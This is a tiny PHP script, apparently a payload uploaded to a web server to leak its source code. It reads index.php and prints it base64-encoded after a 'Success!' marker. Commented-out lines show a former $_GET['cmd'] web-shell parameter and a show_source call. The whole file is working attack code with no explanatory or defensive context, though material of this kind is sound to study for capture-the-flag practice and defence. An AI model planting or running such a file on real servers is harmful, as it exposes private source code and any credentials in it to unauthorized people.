<?php
  echo("Success!\n");
  //$command = $_GET['cmd'];
  //echo $command."\n";
  $file = file_get_contents("index.php");
  echo base64_encode($file);
  //show_source(__FILE__);
?>
